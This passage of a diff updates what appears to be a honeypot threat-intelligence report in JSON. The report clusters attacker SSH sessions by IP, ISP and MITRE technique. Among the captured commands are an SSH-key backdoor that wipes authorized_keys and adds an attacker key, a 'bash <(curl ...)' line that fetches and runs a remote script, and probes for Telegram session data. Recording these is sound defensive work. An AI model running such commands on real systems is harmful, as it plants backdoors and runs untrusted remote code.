+          "timestamp": "2026-08-10T16:02:00.444996Z"
+        },
+        {
+          "session_id": "IR-f81c14557c81",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T16:03:48.577017Z"
+        },
+        {
+          "session_id": "IR-07ded7cf139f",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T16:05:37.285435Z"
+        },
+        {
+          "session_id": "IR-3176e57e4658",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T16:07:23.751145Z"
+        },
+        {
+          "session_id": "IR-65eeb634ada7",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T16:09:16.922040Z"
+        },
+        {
+          "session_id": "IR-97aa603dee6c",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T16:11:10.561455Z"
+        },
+        {
+          "session_id": "IR-dd181adc6d30",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T16:13:07.396086Z"
+        },
+        {
+          "session_id": "IR-3974d775f882",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T16:14:56.969799Z"
+        },
+        {
+          "session_id": "IR-3acd2a5e68fa",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T16:16:47.917499Z"
+        },
+        {
+          "session_id": "IR-5c12aa8bef6c",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T16:18:38.286092Z"
+        },
+        {
+          "session_id": "IR-7bae72881ba6",
+          "src_ip": "193.32.162.84",
+          "country": "",
+          "isp": "",
           "command_count": 9,
           "timestamp": "2026-08-10T18:15:12.922082Z"
         },
         {
           "session_id": "IR-99048bdcbedc",
           "src_ip": "193.32.162.84",
-          "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "country": "",
+          "isp": "",
           "command_count": 9,
           "timestamp": "2026-08-10T18:18:00.845832Z"
         },
         {
           "session_id": "IR-6d92e6cba10d",
           "src_ip": "193.32.162.84",
-          "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "country": "",
+          "isp": "",
           "command_count": 9,
           "timestamp": "2026-08-10T18:20:47.697856Z"
         },
         {
           "session_id": "IR-bc69bca9a068",
           "src_ip": "193.32.162.84",
-          "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "country": "",
+          "isp": "",
           "command_count": 9,
           "timestamp": "2026-08-10T18:23:43.517881Z"
         },
         {
           "session_id": "IR-24397fae2d38",
           "src_ip": "193.32.162.84",
-          "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "country": "",
+          "isp": "",
           "command_count": 9,
           "timestamp": "2026-08-10T18:26:30.270858Z"
         },
         {
           "session_id": "IR-e7fe8c5980df",
           "src_ip": "193.32.162.84",
-          "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "country": "",
+          "isp": "",
           "command_count": 9,
           "timestamp": "2026-08-10T18:29:11.613670Z"
         },
         {
           "session_id": "IR-ad167866e510",
           "src_ip": "193.32.162.84",
-          "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "country": "",
+          "isp": "",
           "command_count": 9,
           "timestamp": "2026-08-10T18:34:06.896231Z"
         },
         {
           "session_id": "IR-8fe083e08cad",
           "src_ip": "193.32.162.84",
-          "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "country": "",
+          "isp": "",
           "command_count": 9,
           "timestamp": "2026-08-10T18:36:33.489915Z"
         },
         {
           "session_id": "IR-25b46488379e",
           "src_ip": "193.32.162.84",
-          "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "country": "",
+          "isp": "",
           "command_count": 9,
           "timestamp": "2026-08-10T18:38:55.889750Z"
         },
         {
           "session_id": "IR-495134a5f1b0",
           "src_ip": "193.32.162.84",
-          "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "country": "",
+          "isp": "",
           "command_count": 9,
           "timestamp": "2026-08-10T18:41:18.776515Z"
         },
         {
           "session_id": "IR-0de8575df46e",
           "src_ip": "193.32.162.84",
-          "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "country": "",
+          "isp": "",
           "command_count": 9,
           "timestamp": "2026-08-10T18:43:45.531564Z"
         },
         {
           "session_id": "IR-13654fb90ede",
           "src_ip": "193.32.162.84",
-          "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "country": "",
+          "isp": "",
           "command_count": 9,
           "timestamp": "2026-08-10T18:46:07.191721Z"
         },
         {
           "session_id": "IR-cda7f225be4a",
           "src_ip": "193.32.162.84",
-          "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "country": "",
+          "isp": "",
           "command_count": 9,
           "timestamp": "2026-08-10T18:48:24.436124Z"
         },
         {
           "session_id": "IR-fddb7b6dd620",
           "src_ip": "193.32.162.84",
-          "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "country": "",
+          "isp": "",
           "command_count": 9,
           "timestamp": "2026-08-10T18:50:42.600224Z"
         },
         {
           "session_id": "IR-7ab78dbd9a8c",
           "src_ip": "193.32.162.84",
-          "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "country": "",
+          "isp": "",
           "command_count": 9,
           "timestamp": "2026-08-10T18:52:55.836181Z"
         },
         {
           "session_id": "IR-1a46e57751fd",
           "src_ip": "2.57.122.168",
-          "country": "RO",
-          "isp": "TECHOFF SRV LIMITED",
+          "country": "",
+          "isp": "",
           "command_count": 9,
           "timestamp": "2026-08-10T18:54:38.643660Z"
         }
       ]
     },
     {
-      "cluster_id": "CLU-003",
+      "cluster_id": "CLU-004",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 2,
+      "unique_ips": [
+        "164.92.109.155",
+        "220.90.220.204"
+      ],
+      "unique_ip_count": 2,
+      "sequence_hash": "c74cbeb6eac6dc54",
+      "ttps": [
+        {
+          "id": "T1083",
+          "name": "File & Directory Discovery"
+        },
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1592",
+          "name": "Gather Victim Host Info"
+        }
+      ],
+      "representative_commands": [
+        "/ip cloud print",
+        "ifconfig",
+        "uname -a",
+        "cat /proc/cpuinfo",
+        "ps | grep '[Mm]iner'",
+        "ps -ef | grep '[Mm]iner'",
+        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*",
+        "locate D877F783D5D3EF8Cs",
+        "echo Hi | cat -n"
+      ],
+      "members": [
+        {
+          "session_id": "IR-8e8d9a70588c",
+          "src_ip": "220.90.220.204",
+          "country": "",
+          "isp": "",
+          "command_count": 9,
+          "timestamp": "2026-08-10T01:25:55.187888Z"
+        },
+        {
+          "session_id": "IR-82dc01fdcc28",
+          "src_ip": "164.92.109.155",
+          "country": "US",
+          "isp": "DigitalOcean, LLC",
+          "command_count": 9,
+          "timestamp": "2026-08-10T09:31:03.896653Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-005",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 7,
+      "unique_ips": [
+        "165.1.75.106",
+        "158.178.141.210",
+        "168.110.102.254",
+        "146.56.164.20"
+      ],
+      "unique_ip_count": 4,
+      "sequence_hash": "d2af147dd3fa2817",
+      "ttps": [
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        }
+      ],
+      "representative_commands": [
+        "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
+        "apt-get update -y",
+        "apt-get install -y python3",
+        "python3 /tmp/bendi.py",
+        "rm /tmp/bendi.py",
+        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
+        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sexy.pp.ua --auto-discovery DsR94pYWmSUpC3n43RmwPxKw"
+      ],
+      "members": [
+        {
+          "session_id": "IR-9cd76e06385f",
+          "src_ip": "158.178.141.210",
+          "country": "AU",
+          "isp": "Oracle Svenska AB",
+          "command_count": 7,
+          "timestamp": "2026-08-10T03:13:23.104118Z"
+        },
+        {
+          "session_id": "IR-2cbfa3e14cbb",
+          "src_ip": "158.178.141.210",
+          "country": "AU",
+          "isp": "Oracle Svenska AB",
+          "command_count": 7,
+          "timestamp": "2026-08-10T03:15:48.800124Z"
+        },
+        {
+          "session_id": "IR-2eeeee175596",
+          "src_ip": "168.110.102.254",
+          "country": "",
+          "isp": "",
+          "command_count": 7,
+          "timestamp": "2026-08-10T05:27:40.672129Z"
+        },
+        {
+          "session_id": "IR-5dd376444a81",
+          "src_ip": "165.1.75.106",
+          "country": "",
+          "isp": "",
+          "command_count": 7,
+          "timestamp": "2026-08-10T06:42:51.437112Z"
+        },
+        {
+          "session_id": "IR-576811f45a9e",
+          "src_ip": "165.1.75.106",
+          "country": "",
+          "isp": "",
+          "command_count": 7,
+          "timestamp": "2026-08-10T06:45:14.677099Z"
+        },
+        {
+          "session_id": "IR-6a5e9ec825c7",
+          "src_ip": "146.56.164.20",
+          "country": "KR",
+          "isp": "Oracle Corporation , Global software solutions , California , USA",
+          "command_count": 7,
+          "timestamp": "2026-08-10T10:36:53.642438Z"
+        },
+        {
+          "session_id": "IR-4e7b5ed8d871",
+          "src_ip": "146.56.164.20",
+          "country": "KR",
+          "isp": "Oracle Corporation , Global software solutions , California , USA",
+          "command_count": 7,
+          "timestamp": "2026-08-10T10:39:03.015816Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-006",
       "is_campaign": false,
       "campaign_name": null,
       "campaign_severity": null,
@@ -352,9 +1583,333 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "43.100.57.229"
+        "64.62.156.142"
       ],
       "unique_ip_count": 1,
+      "sequence_hash": "15bed5cce2776cb9",
+      "ttps": [],
+      "representative_commands": [
+        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20060609 Firefox/123.0esr",
+        "Accept: */*",
+        "Accept-Encoding: gzip"
+      ],
+      "members": [
+        {
+          "session_id": "IR-a2e8c7e62f43",
+          "src_ip": "64.62.156.142",
+          "country": "US",
+          "isp": "The Shadowserver Foundation, Inc.",
+          "command_count": 3,
+          "timestamp": "2026-08-10T05:30:45.804792Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-007",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "45.79.181.251"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "0084449e5825fe2e",
+      "ttps": [],
+      "representative_commands": [
+        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+        "Accept: */*",
+        "Accept-Encoding: gzip"
+      ],
+      "members": [
+        {
+          "session_id": "IR-45c753d19a18",
+          "src_ip": "45.79.181.251",
+          "country": "",
+          "isp": "",
+          "command_count": 3,
+          "timestamp": "2026-08-10T10:25:11.500261Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-008",
+      "is_campaign": true,
+      "campaign_name": "mdrfckr SSH Key Injection",
+      "campaign_severity": "HIGH",
+      "campaign_description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
+      "matched_campaigns": [
+        {
+          "name": "mdrfckr SSH Key Injection",
+          "ttps": [
+            "T1021.004",
+            "T1078",
+            "T1105"
+          ],
+          "severity": "HIGH",
+          "description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
+          "pattern_hits": 3,
+          "pattern_total": 3
+        }
+      ],
+      "session_count": 9,
+      "unique_ips": [
+        "144.225.187.68",
+        "135.13.11.134",
+        "92.62.233.214",
+        "154.83.15.101",
+        "69.6.234.27",
+        "45.144.233.139",
+        "37.77.150.241",
+        "213.176.16.218",
+        "61.76.136.25"
+      ],
+      "unique_ip_count": 9,
+      "sequence_hash": "98af0db988d5971c",
+      "ttps": [
+        {
+          "id": "T1021.004",
+          "name": "Remote Services: SSH"
+        },
+        {
+          "id": "T1078",
+          "name": "Valid Accounts"
+        },
+        {
+          "id": "T1070",
+          "name": "Indicator Removal"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files"
+        },
+        {
+          "id": "T1105",
+          "name": "T1105"
+        }
+      ],
+      "representative_commands": [
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
+      ],
+      "members": [
+        {
+          "session_id": "IR-2bf0f4670500",
+          "src_ip": "92.62.233.214",
+          "country": "CZ",
+          "isp": "Starnet s.r.o.",
+          "command_count": 2,
+          "timestamp": "2026-08-10T01:56:27.358119Z"
+        },
+        {
+          "session_id": "IR-1949fb6a39c8",
+          "src_ip": "69.6.234.27",
+          "country": "CO",
+          "isp": "Newfold Digital, Inc.",
+          "command_count": 2,
+          "timestamp": "2026-08-10T04:14:00.088467Z"
+        },
+        {
+          "session_id": "IR-cee19c4d308a",
+          "src_ip": "154.83.15.101",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-08-10T10:42:28.937698Z"
+        },
+        {
+          "session_id": "IR-561873e0422b",
+          "src_ip": "213.176.16.218",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-08-10T10:49:04.682203Z"
+        },
+        {
+          "session_id": "IR-216103a48205",
+          "src_ip": "135.13.11.134",
+          "country": "IN",
+          "isp": "Microsoft Limited",
+          "command_count": 2,
+          "timestamp": "2026-08-10T12:20:05.289388Z"
+        },
+        {
+          "session_id": "IR-835c8119068d",
+          "src_ip": "61.76.136.25",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-08-10T15:21:08.325797Z"
+        },
+        {
+          "session_id": "IR-f3140842d986",
+          "src_ip": "45.144.233.139",
+          "country": "DE",
+          "isp": "DGTL TECH UK LLP",
+          "command_count": 2,
+          "timestamp": "2026-08-10T15:22:06.098833Z"
+        },
+        {
+          "session_id": "IR-a0aa20086d9d",
+          "src_ip": "37.77.150.241",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-08-10T15:40:35.985001Z"
+        },
+        {
+          "session_id": "IR-207157d55623",
+          "src_ip": "144.225.187.68",
+          "country": "US",
+          "isp": "Ace Data Centers II, L.L.C.",
+          "command_count": 2,
+          "timestamp": "2026-08-10T16:30:12.033855Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-009",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 3,
+      "unique_ips": [
+        "207.175.148.67",
+        "207.175.35.41",
+        "207.175.155.36"
+      ],
+      "unique_ip_count": 3,
+      "sequence_hash": "6c2b02475f4c7e7e",
+      "ttps": [],
+      "representative_commands": [
+        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
+        "Accept-Encoding: gzip"
+      ],
+      "members": [
+        {
+          "session_id": "IR-280febe0f7a8",
+          "src_ip": "207.175.155.36",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 2,
+          "timestamp": "2026-08-10T03:11:23.041919Z"
+        },
+        {
+          "session_id": "IR-5d0a17ac0eec",
+          "src_ip": "207.175.148.67",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-08-10T03:40:03.126787Z"
+        },
+        {
+          "session_id": "IR-0fbefe2ca4bb",
+          "src_ip": "207.175.35.41",
+          "country": "",
+          "isp": "",
+          "command_count": 2,
+          "timestamp": "2026-08-10T04:16:35.909143Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-010",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "42.240.164.208"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "c32b4937ce8564ea",
+      "ttps": [
+        {
+          "id": "T1021.004",
+          "name": "Remote Services: SSH"
+        }
+      ],
+      "representative_commands": [
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh"
+      ],
+      "members": [
+        {
+          "session_id": "IR-6134834c3ec9",
+          "src_ip": "42.240.164.208",
+          "country": "",
+          "isp": "",
+          "command_count": 1,
+          "timestamp": "2026-08-10T02:50:06.126886Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-011",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 3,
+      "unique_ips": [
+        "207.175.148.67",
+        "207.175.35.41",
+        "207.175.155.36"
+      ],
+      "unique_ip_count": 3,
+      "sequence_hash": "758d61f26a444483",
+      "ttps": [],
+      "representative_commands": [
+        "PING"
+      ],
+      "members": [
+        {
+          "session_id": "IR-0727252a1963",
+          "src_ip": "207.175.155.36",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-10T03:11:31.635632Z"
+        },
+        {
+          "session_id": "IR-d117f0b77fa0",
+          "src_ip": "207.175.148.67",
+          "country": "",
+          "isp": "",
+          "command_count": 1,
+          "timestamp": "2026-08-10T03:40:16.736772Z"
+        },
+        {
+          "session_id": "IR-ffa4827c7605",
+          "src_ip": "207.175.35.41",
+          "country": "",
+          "isp": "",
+          "command_count": 1,
+          "timestamp": "2026-08-10T04:16:49.299871Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-012",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 4,
+      "unique_ips": [
+        "43.100.57.229",
+        "163.177.76.83",
+        "43.106.81.238",
+        "183.56.192.210"
+      ],
+      "unique_ip_count": 4,
       "sequence_hash": "6fa4c8ac58e7a1d9",
       "ttps": [
         {
@@ -367,6 +1922,30 @@
       ],
       "members": [
         {
+          "session_id": "IR-456141b052db",
+          "src_ip": "43.106.81.238",
+          "country": "SG",
+          "isp": "Alibaba Cloud (Singapore) Private Limited",
+          "command_count": 1,
+          "timestamp": "2026-08-10T13:36:58.128184Z"
+        },
+        {
+          "session_id": "IR-ec40f87a72e7",
+          "src_ip": "183.56.192.210",
+          "country": "",
+          "isp": "",
+          "command_count": 1,
+          "timestamp": "2026-08-10T14:11:19.568490Z"
+        },
+        {
+          "session_id": "IR-e81ff60b7ac2",
+          "src_ip": "163.177.76.83",
+          "country": "",
+          "isp": "",
+          "command_count": 1,
+          "timestamp": "2026-08-10T16:54:41.804832Z"
+        },
+        {
           "session_id": "IR-cbdac298cf31",
           "src_ip": "43.100.57.229",
           "country": "HK",
@@ -377,7 +1956,7 @@
       ]
     },
     {
-      "cluster_id": "CLU-004",
+      "cluster_id": "CLU-013",
       "is_campaign": false,
       "campaign_name": null,
       "campaign_severity": null,
@@ -385,9 +1964,41 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "149.28.138.88"
+        "77.239.124.110"
       ],
       "unique_ip_count": 1,
+      "sequence_hash": "7d4a1f6964afd31e",
+      "ttps": [],
+      "representative_commands": [
+        "echo SHELL_TEST"
+      ],
+      "members": [
+        {
+          "session_id": "IR-6e659caef90d",
+          "src_ip": "77.239.124.110",
+          "country": "",
+          "isp": "",
+          "command_count": 1,
+          "timestamp": "2026-08-10T16:03:00.480067Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-014",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 5,
+      "unique_ips": [
+        "185.148.129.112",
+        "193.151.151.92",
+        "172.245.181.192",
+        "43.172.92.108",
+        "149.28.138.88"
+      ],
+      "unique_ip_count": 5,
       "sequence_hash": "2d50aaadc2336f39",
       "ttps": [
         {
@@ -400,17 +2011,49 @@
       ],
       "members": [
         {
+          "session_id": "IR-a1a3147931d4",
+          "src_ip": "185.148.129.112",
+          "country": "US",
+          "isp": "A2 Hosting, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-10T16:38:20.701484Z"
+        },
+        {
+          "session_id": "IR-02dd8f3cfbb5",
+          "src_ip": "193.151.151.92",
+          "country": "",
+          "isp": "",
+          "command_count": 1,
+          "timestamp": "2026-08-10T16:38:23.204468Z"
+        },
+        {
+          "session_id": "IR-2b07af089d1c",
+          "src_ip": "172.245.181.192",
+          "country": "",
+          "isp": "",
+          "command_count": 1,
+          "timestamp": "2026-08-10T16:38:24.013480Z"
+        },
+        {
+          "session_id": "IR-fc2482b6f460",
+          "src_ip": "43.172.92.108",
+          "country": "US",
+          "isp": "ACEVILLE PTE.LTD.",
+          "command_count": 1,
+          "timestamp": "2026-08-10T16:43:51.855874Z"
+        },
+        {
           "session_id": "IR-c6a5a46a21ed",
           "src_ip": "149.28.138.88",
-          "country": "SG",
-          "isp": "Vultr Holdings, LLC",
+          "country": "",
+          "isp": "",
           "command_count": 1,
           "timestamp": "2026-08-10T18:24:47.881872Z"
         }
       ]
     },
     {
-      "cluster_id": "CLU-005",
+      "cluster_id": "CLU-015",
       "is_campaign": true,
       "campaign_name": "mdrfckr SSH Key Injection",
       "campaign_severity": "HIGH",
@@ -429,11 +2072,15 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 1,
+      "session_count": 5,
       "unique_ips": [
+        "185.148.129.112",
+        "193.151.151.92",
+        "172.245.181.192",
+        "43.172.92.108",
         "149.28.138.88"
       ],
-      "unique_ip_count": 1,
+      "unique_ip_count": 5,
       "sequence_hash": "6576c800ac19b74a",
       "ttps": [
         {
@@ -458,10 +2105,42 @@
       ],
       "members": [
         {
+          "session_id": "IR-c745e0d5cafb",
+          "src_ip": "185.148.129.112",
+          "country": "US",
+          "isp": "A2 Hosting, LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-10T16:38:21.799778Z"
+        },
+        {
+          "session_id": "IR-2930bba6b4ef",
+          "src_ip": "172.245.181.192",
+          "country": "",
+          "isp": "",
+          "command_count": 1,
+          "timestamp": "2026-08-10T16:38:25.226192Z"
+        },
+        {
+          "session_id": "IR-30a60904bff9",
+          "src_ip": "43.172.92.108",
+          "country": "US",
+          "isp": "ACEVILLE PTE.LTD.",
+          "command_count": 1,
+          "timestamp": "2026-08-10T16:43:53.087634Z"
+        },
+        {
+          "session_id": "IR-4c212c7ce76c",
+          "src_ip": "193.151.151.92",
+          "country": "",
+          "isp": "",
+          "command_count": 1,
+          "timestamp": "2026-08-10T16:44:27.001904Z"
+        },
+        {
           "session_id": "IR-38bff9868e69",
           "src_ip": "149.28.138.88",
-          "country": "SG",
-          "isp": "Vultr Holdings, LLC",
+          "country": "",
+          "isp": "",
           "command_count": 1,
           "timestamp": "2026-08-10T18:24:52.876410Z"
         }
